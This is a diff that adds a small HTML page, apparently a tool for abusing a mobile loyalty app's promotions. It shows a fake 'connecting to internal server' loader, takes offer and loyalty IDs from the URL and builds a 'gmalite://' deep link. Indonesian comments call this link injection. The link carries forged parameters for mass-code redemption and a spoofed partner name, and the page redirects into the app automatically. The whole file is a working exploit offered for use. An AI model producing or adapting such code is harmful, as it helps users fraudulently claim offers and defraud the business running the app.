@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing...</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #da291c; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #ffbc0d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 20px; font-weight: bold; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <p>MENGHUBUNGKAN KE INTERNAL SERVER...</p>
+
+    <script>
+        window.onload = function() {
+            // AMBIL DATA DARI URL (Query String)
+            const params = new URLSearchParams(window.location.search);
+            const off = params.get('offer_id');
+            const loy = params.get('loyalty_id');
+            const partner = encodeURIComponent("Tiktok Live 109.4");
+
+            if (!off || !loy) {
+                document.body.innerHTML = "<h1>ERROR: ID TIDAK DITEMUKAN</h1>";
+                return;
+            }
+
+            // KONSTRUKSI LINK INJEKSI
+            const deepLink = "gmalite://offers/details?" + 
+                             "offer_id=" + off + 
+                             "&loyalty_id=" + loy + 
+                             "&view=claim&is_mass_code=1&is_native=true" +
+                             "&action=redeem&partner=" + partner;
+
+            // EKSEKUSI REDIRECT (Teknik Mukidi)
+            setTimeout(function() {
+                window.location.replace(deepLink);
+            }, 1500);
+
+            // FALLBACK: Balik ke Home jika Stuck
+            setTimeout(function() {
+                window.location.replace("gmalite://home");
+            }, 4000);
+        };
+    </script>
+</body>
+</html>
